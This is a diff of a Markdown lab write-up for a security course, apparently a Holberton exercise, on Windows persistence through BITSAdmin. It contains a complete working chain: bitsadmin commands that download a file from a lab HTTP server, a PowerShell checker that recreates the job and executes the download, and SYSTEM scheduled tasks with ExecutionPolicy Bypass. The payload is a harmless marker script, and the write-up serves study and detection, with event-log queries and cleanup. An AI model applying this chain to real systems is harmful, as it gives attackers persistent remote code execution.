@@ -704,128 +704,343 @@ Important detection and mitigation points include:
 
 # Task 4 - Persistence Using BITSAdmin
 
-## Objective
+## Controlled Lab Scenario
 
-The goal of this task was to study how the Background Intelligent Transfer Service (BITS) can be abused as a persistence mechanism on Windows systems.
+This exercise was designed as a controlled proof of concept inside the dedicated Windows virtual machine.
 
-BITS is a legitimate Windows service used to transfer files in the background. It is commonly used by Windows Update and other system components to download or upload data efficiently, even when network conditions are unstable.
+Instead of using a real malicious payload, I used a harmless batch script that creates a marker file when executed. This safely demonstrates the download and execution chain without opening a connection, modifying security settings, or providing remote access.
 
-From an attacker perspective, this feature can be abused to download a payload in the background and maintain access by recreating or retrying jobs under specific conditions.
-
-For this task, the focus was educational. The payload concept was treated as a benign test payload used only to simulate attacker behavior in a controlled lab environment.
-
-## Technique Overview
-
-BITS jobs are managed by the Background Intelligent Transfer Service. They can be created, listed, resumed, completed, or removed using tools such as:
+The following names and paths were used:
 
 ```text
-bitsadmin
+BITS job name: hackjob
+Downloaded payload: C:\BITS-Lab\bits_payload.bat
+Checker script: C:\BITS-Lab\check-hackjob.ps1
+Marker file: C:\Users\Public\bits-lab-marker.txt
+Startup task: BITS-HackJob-Startup
+Monitoring task: BITS-HackJob-Monitor
 ```
 
-or PowerShell cmdlets related to BITS transfers.
-
-A BITS job can be configured to download a file from a remote or local source and store it on the target system. Attackers may abuse this behavior because BITS:
-
-* Is a legitimate Windows component.
-* Runs in the background.
-* Can survive temporary network interruptions.
-* Can resume interrupted transfers.
-* May appear less suspicious than custom download tools.
-* Can be combined with other persistence mechanisms.
-
-BITS alone is mainly a transfer mechanism. Persistence becomes more effective when BITS is combined with another mechanism, such as a scheduled task or a monitoring script that recreates the job if it is removed.
-
-## Lab Scenario
-
-In a controlled lab scenario, an attacker could abuse BITSAdmin to create a background download job that retrieves a payload.
-
-For ethical and educational purposes, the payload should be harmless. A safe example would be a test script or text file that writes a marker file locally instead of performing any malicious action.
-
-The intended workflow is:
+The complete workflow was:
 
 ```text
-1. Enumerate existing BITS jobs.
-2. Create a new BITS download job.
-3. Configure the job to download a benign test payload.
-4. Complete or trigger the job.
-5. Use a checker script to monitor whether the job still exists.
-6. Automate the checker with a scheduled task.
-7. Review Windows logs for detection indicators.
-8. Remove the BITS job and related persistence artifacts.
+Lab HTTP server
+      ↓
+BITS job named hackjob
+      ↓
+Benign batch payload downloaded
+      ↓
+PowerShell checker monitors the job
+      ↓
+Downloaded file is completed and executed
+      ↓
+A marker file confirms execution
+      ↓
+Scheduled Tasks restart the checker
+```
+
+## Preparing the Benign Payload
+
+On the controlled lab server, I created a harmless batch file named:
+
+```text
+bits_payload.bat
+```
+
+Its content was:
+
+```bat
+@echo off
+
+REM Benign payload used only inside the controlled Holberton lab.
+REM It creates a marker file to prove that the downloaded file executed.
+
+echo BITS lab payload executed on %DATE% at %TIME% > C:\Users\Public\bits-lab-marker.txt
+```
+
+The payload does not establish a connection or provide access to the machine. It only writes a timestamp to a local text file.
+
+From the directory containing the file, I started a temporary HTTP server:
+
+```bash
+python3 -m http.server 8000 --bind 0.0.0.0
+```
+
+The resulting lab URL followed this format:
+
+```text
+http://<LAB_SERVER_IP>:8000/bits_payload.bat
 ```
 
 ## BITS Job Enumeration
 
-Before creating or analyzing a BITS job, existing jobs should be enumerated.
-
-This can be done with:
+Before creating the test job, I enumerated the existing BITS jobs from an elevated Command Prompt:
 
 ```cmd
 bitsadmin /list /allusers /verbose
 ```
 
-This command helps identify existing BITS jobs and review useful information such as:
+This provided information about existing jobs, including their display names, owners, states, transfer paths, and errors.
 
-* Job name
-* Owner
-* State
-* Remote URL
-* Local destination path
-* Error count
-* Transfer status
+I also checked for a job specifically named `hackjob`:
 
-From a defensive perspective, unusual BITS jobs should be investigated, especially if they download files from unknown locations or write to suspicious directories.
-
-## Controlled BITS Persistence Concept
-
-The persistence concept for this task is based on abusing a trusted Windows feature to retrieve a payload in the background.
-
-A safe lab demonstration would use:
-
-```text
-Job type:
-Download job
+```cmd
+bitsadmin /info hackjob /verbose
 ```
 
-```text
-Payload type:
-Benign test payload
+Because the job did not exist yet, BITSAdmin returned an error indicating that no matching job was found.
+
+## Creating the BITS Job
+
+I first created the working directory:
+
+```cmd
+mkdir C:\BITS-Lab
 ```
 
-```text
-Purpose:
-Simulate how an attacker could stage a file using BITS
+I then created a download job named `hackjob`:
+
+```cmd
+bitsadmin /create /download hackjob
 ```
 
-The BITS job itself is not necessarily enough to guarantee full persistence. However, it can be combined with a scheduled task or checker script that monitors the job and recreates it if removed.
+A newly created BITS job is initially suspended. I added the benign payload to the job by specifying its remote URL and local destination:
 
-This demonstrates how attackers may chain legitimate Windows features together to maintain access.
-
-## Checker Script Concept
-
-The task also required the concept of a checker script.
-
-The purpose of the checker script is to verify whether the expected BITS job exists. If the job has been removed, the script could recreate it.
-
-In a defensive learning context, this helps demonstrate how persistence can be layered:
-
-```text
-Scheduled Task
-   ↓
-PowerShell checker script
-   ↓
-BITS job verification
-   ↓
-BITS job recreation if missing
+```cmd
+bitsadmin /addfile hackjob http://<LAB_SERVER_IP>:8000/bits_payload.bat C:\BITS-Lab\bits_payload.bat
 ```
 
-This combination makes the persistence more resilient because removing only the BITS job may not be enough if another mechanism recreates it.
+The `/addfile` command associates a remote URL with a local destination inside an existing job.
+
+## Retry and Error-Handling Configuration
+
+To demonstrate BITS retry behavior, I configured a minimum retry delay of 60 seconds:
+
+```cmd
+bitsadmin /setminretrydelay hackjob 60
+```
+
+I also configured a five-minute no-progress timeout:
+
+```cmd
+bitsadmin /setnoprogresstimeout hackjob 300
+```
+
+The first setting controls how long BITS waits before retrying after a transient error. The second determines how long a job may remain without progress before entering an error state.
+
+I then activated the job:
+
+```cmd
+bitsadmin /resume hackjob
+```
+
+After creation, BITS jobs must be resumed before entering the transfer queue.
+
+I monitored the job with:
+
+```cmd
+bitsadmin /monitor hackjob
+```
+
+The job details could also be inspected at any time with:
+
+```cmd
+bitsadmin /info hackjob /verbose
+```
+
+Once the state reached:
+
+```text
+TRANSFERRED
+```
+
+the download was ready to be completed. A transferred BITS job must be completed before its downloaded file becomes normally available at the destination path. ([Microsoft Learn][4])
+
+## PowerShell Checker Script
+
+To monitor the BITS job and recreate it if it was removed, I created:
+
+```text
+C:\BITS-Lab\check-hackjob.ps1
+```
+
+The script used the following configuration:
+
+```powershell
+# Benign BITS persistence demonstration for an authorized lab only.
+
+$JobName = "hackjob"
+$RemoteUrl = "http://<LAB_SERVER_IP>:8000/bits_payload.bat"
+$Destination = "C:\BITS-Lab\bits_payload.bat"
+$LogFile = "C:\BITS-Lab\checker.log"
+
+function Write-LabLog {
+    param([string]$Message)
+
+    $Timestamp = Get-Date -Format "yyyy-MM-dd HH:mm:ss"
+    "$Timestamp - $Message" | Out-File `
+        -FilePath $LogFile `
+        -Append `
+        -Encoding utf8
+}
+
+try {
+    $Job = Get-BitsTransfer -AllUsers -ErrorAction SilentlyContinue |
+        Where-Object DisplayName -eq $JobName |
+        Select-Object -First 1
+
+    if (-not $Job) {
+        Write-LabLog "BITS job not found. Recreating $JobName."
+
+        & bitsadmin.exe /create /download $JobName | Out-Null
+        & bitsadmin.exe /addfile $JobName $RemoteUrl $Destination | Out-Null
+        & bitsadmin.exe /setminretrydelay $JobName 60 | Out-Null
+        & bitsadmin.exe /setnoprogresstimeout $JobName 300 | Out-Null
+        & bitsadmin.exe /resume $JobName | Out-Null
+
+        Write-LabLog "BITS job created and resumed."
+        exit 0
+    }
+
+    Write-LabLog "Job state: $($Job.JobState)"
+
+    switch ($Job.JobState) {
+        "Transferred" {
+            & bitsadmin.exe /complete $JobName | Out-Null
+            Write-LabLog "Transfer completed."
+
+            if (Test-Path $Destination) {
+                Start-Process `
+                    -FilePath "C:\Windows\System32\cmd.exe" `
+                    -ArgumentList "/c `"$Destination`"" `
+                    -Wait
+
+                Write-LabLog "Benign payload executed."
+            }
+        }
+
+        "TransientError" {
+            & bitsadmin.exe /resume $JobName | Out-Null
+            Write-LabLog "Transient error detected. Job resumed."
+        }
+
+        "Error" {
+            & bitsadmin.exe /cancel $JobName | Out-Null
+            Write-LabLog "Permanent error detected. Job cancelled."
+
+            & bitsadmin.exe /create /download $JobName | Out-Null
+            & bitsadmin.exe /addfile $JobName $RemoteUrl $Destination | Out-Null
+            & bitsadmin.exe /setminretrydelay $JobName 60 | Out-Null
+            & bitsadmin.exe /setnoprogresstimeout $JobName 300 | Out-Null
+            & bitsadmin.exe /resume $JobName | Out-Null
+
+            Write-LabLog "BITS job recreated after error."
+        }
+
+        "Suspended" {
+            & bitsadmin.exe /resume $JobName | Out-Null
+            Write-LabLog "Suspended job resumed."
+        }
+    }
+}
+catch {
+    Write-LabLog "Checker error: $($_.Exception.Message)"
+    exit 1
+}
+```
+
+The script performs four main actions:
+
+1. Searches for the `hackjob` BITS job.
+2. Recreates it if it is missing.
+3. Resumes it after transient or suspended states.
+4. Completes the transfer and executes the harmless payload.
+
+The execution result is recorded in:
+
+```text
+C:\BITS-Lab\checker.log
+```
+
+## Scheduled Task Persistence
+
+I used Scheduled Tasks to run the checker automatically.
+
+The first task launches the checker when Windows starts:
+
+```cmd
+schtasks /create /tn "BITS-HackJob-Startup" /sc onstart /ru SYSTEM /rl HIGHEST /tr "powershell.exe -NoProfile -ExecutionPolicy Bypass -File C:\BITS-Lab\check-hackjob.ps1" /f
+```
+
+The second task executes the checker every five minutes so that a removed or failed job can be recreated during the current session:
+
+```cmd
+schtasks /create /tn "BITS-HackJob-Monitor" /sc minute /mo 5 /ru SYSTEM /rl HIGHEST /tr "powershell.exe -NoProfile -ExecutionPolicy Bypass -File C:\BITS-Lab\check-hackjob.ps1" /f
+```
+
+Windows supports startup and recurring time-based scheduled-task triggers. The `/sc onstart` option runs a task when the system starts, while `/sc minute /mo 5` creates a five-minute interval.
+
+I verified both tasks with:
+
+```cmd
+schtasks /query /tn "BITS-HackJob-Startup" /v /fo list
+```
+
+```cmd
+schtasks /query /tn "BITS-HackJob-Monitor" /v /fo list
+```
+
+For an immediate test, I manually started the checker task:
+
+```cmd
+schtasks /run /tn "BITS-HackJob-Monitor"
+```
+
+## Execution Validation
+
+I verified the BITS job state with:
+
+```cmd
+bitsadmin /info hackjob /verbose
+```
+
+I checked the checker log with:
+
+```powershell
+Get-Content C:\BITS-Lab\checker.log
+```
+
+After the transfer completed and the payload executed, I verified the marker file:
+
+```powershell
+Get-Content C:\Users\Public\bits-lab-marker.txt
+```
+
+The file contained the date and time at which the harmless payload was executed.
+
+To test the restoration mechanism, I cancelled the BITS job:
+
+```cmd
+bitsadmin /cancel hackjob
+```
+
+I then ran the monitoring task again:
+
+```cmd
+schtasks /run /tn "BITS-HackJob-Monitor"
+```
+
+Finally, I confirmed that the checker had recreated the job:
+
+```cmd
+bitsadmin /info hackjob /verbose
+```
+
+This demonstrated that deleting only the BITS job was insufficient while the scheduled checker remained active.
 
 ## Detection and Analysis
 
-BITS activity can be investigated using Windows Event Viewer.
-
-Relevant logs include:
+BITS activity was reviewed in Event Viewer under:
 
 ```text
 Event Viewer
@@ -836,79 +1051,143 @@ Event Viewer
                 └── Operational
 ```
 
-Suspicious indicators may include:
+Microsoft identifies the `Microsoft-Windows-Bits-Client/Operational` channel as the relevant event log for BITS transfer details and errors.
 
-* Unexpected BITS jobs.
-* Jobs created by unusual users.
-* Downloads from unknown or external locations.
-* Files written to suspicious paths.
-* Repeated job creation after deletion.
-* BITS activity followed by script or binary execution.
-* Correlation with scheduled task creation.
+The same events can be queried with PowerShell:
 
-Additional tools such as Autoruns can also help identify related persistence mechanisms, especially if a scheduled task or startup entry is used to recreate the BITS job.
-
-## Cleanup
-
-After the analysis, the suspicious BITS job should be removed.
-
-A BITS job can be deleted with:
-
-```cmd
-bitsadmin /cancel <job_name>
+```powershell
+Get-WinEvent `
+    -LogName "Microsoft-Windows-Bits-Client/Operational" `
+    -MaxEvents 50 |
+    Select-Object TimeCreated, Id, LevelDisplayName, Message
 ```
 
-After removal, the job list should be checked again:
+I searched specifically for references to the job name, destination file, or lab server:
+
+```powershell
+Get-WinEvent `
+    -LogName "Microsoft-Windows-Bits-Client/Operational" `
+    -MaxEvents 200 |
+    Where-Object {
+        $_.Message -match "hackjob|bits_payload|<LAB_SERVER_IP>"
+    } |
+    Select-Object TimeCreated, Id, Message
+```
+
+I also inspected the associated scheduled tasks:
+
+```powershell
+Get-ScheduledTask |
+    Where-Object TaskName -like "BITS-HackJob*" |
+    Select-Object TaskName, State, TaskPath
+```
+
+Autoruns can help expose the scheduled-task component, but it does not replace direct BITS job enumeration. The BITS job itself should be checked with BITSAdmin, `Get-BitsTransfer`, or the BITS event logs.
+
+## Remediation and Cleanup
+
+The persistence chain contained several separate artifacts:
+
+```text
+BITS job
+PowerShell checker
+Startup scheduled task
+Recurring scheduled task
+Downloaded payload
+Marker and log files
+```
+
+Removing only `hackjob` would not fully remediate the system because the scheduled checker could recreate it.
+
+I first disabled the restoration mechanisms by deleting both scheduled tasks:
+
+```cmd
+schtasks /delete /tn "BITS-HackJob-Startup" /f
+```
+
+```cmd
+schtasks /delete /tn "BITS-HackJob-Monitor" /f
+```
+
+I then cancelled the BITS job:
+
+```cmd
+bitsadmin /cancel hackjob
+```
+
+I removed the remaining files:
+
+```powershell
+Remove-Item "C:\BITS-Lab\bits_payload.bat" -Force -ErrorAction SilentlyContinue
+Remove-Item "C:\BITS-Lab\check-hackjob.ps1" -Force -ErrorAction SilentlyContinue
+Remove-Item "C:\BITS-Lab\checker.log" -Force -ErrorAction SilentlyContinue
+Remove-Item "C:\Users\Public\bits-lab-marker.txt" -Force -ErrorAction SilentlyContinue
+Remove-Item "C:\BITS-Lab" -Force -Recurse -ErrorAction SilentlyContinue
+```
+
+Finally, I verified that no related artifacts remained:
 
 ```cmd
 bitsadmin /list /allusers /verbose
 ```
 
-If a checker script or scheduled task was created as part of the lab, those artifacts should also be removed.
+```powershell
+Test-Path "C:\BITS-Lab"
+Test-Path "C:\Users\Public\bits-lab-marker.txt"
+```
 
-This is important because persistence mechanisms are often layered. Removing only one component may not fully restore the system.
+The two `Test-Path` commands returned:
+
+```text
+False
+```
+
+## Defensive Remediation
+
+In a real incident, remediation should include more than deleting the visible BITS job.
+
+Recommended actions include:
+
+* Identify and disable the mechanism recreating the job before cancelling it.
+* Review scheduled tasks, services, Registry autoruns, WMI subscriptions, and Startup folders.
+* Inspect the job owner, source URL, local path, state, and notification configuration.
+* Preserve relevant logs and job details before cleanup.
+* Quarantine and analyze downloaded files.
+* Review PowerShell and process-creation telemetry.
+* Block or investigate the remote source used by the job.
+* Determine how the attacker obtained the privileges required to create the persistence chain.
+* Rotate exposed credentials when compromise is suspected.
+* Confirm that the persistence does not return after reboot.
 
 ## Result
 
-This task demonstrated how BITSAdmin can be abused as part of a Windows persistence strategy.
+This controlled exercise demonstrated how BITS can be combined with PowerShell and Scheduled Tasks to create layered Windows persistence.
 
-The key idea is that BITS is a legitimate Windows transfer service, but attackers can misuse it to download payloads in the background and combine it with scheduled tasks or checker scripts for persistence.
-
-The identified persistence concept was:
+The BITS job was named:
 
 ```text
-BITSAdmin-based persistence
+hackjob
 ```
 
-The supporting mechanism was:
+The downloaded payload was a harmless batch script that created a local marker file. The PowerShell checker monitored the job, handled common failure states, and recreated it when missing.
+
+The scheduled tasks ensured that the checker ran:
 
 ```text
-Checker script and scheduled task concept
+At system startup
+Every five minutes
 ```
 
-No flag was required for this task. The objective was to understand, document, detect, and clean up the persistence technique.
+The execution was validated through:
 
-## Security Takeaways
+```text
+BITS job information
+Checker logs
+The marker file
+BITS Client Operational events
+Scheduled Task inspection
+```
 
-This task highlights how trusted Windows components can be abused for persistence.
+All created artifacts were then removed from the virtual machine.
 
-From a defensive perspective, BITS activity should be monitored because attackers may use it to download payloads while blending in with legitimate system behavior.
-
-Important detection and mitigation points include:
-
-* Monitor BITS job creation and modification.
-* Review BITS Client Operational logs.
-* Investigate jobs created by unusual users.
-* Correlate BITS activity with scheduled task creation.
-* Look for repeated recreation of deleted BITS jobs.
-* Restrict unnecessary script execution.
-* Monitor suspicious download destinations.
-* Remove all related artifacts during cleanup, not only the BITS job.
-
-## MITRE ATT&CK Mapping
-
-| Tactic          | Technique                          | ID        |
-| --------------- | ---------------------------------- | --------- |
-| Persistence     | BITS Jobs                          | T1197     |
-| Defense Evasion | BITS Jobs                          | T1197     |
-| Persistence     | Scheduled Task/Job: Scheduled Task | T1053.005 |
+No flag was required for this task.
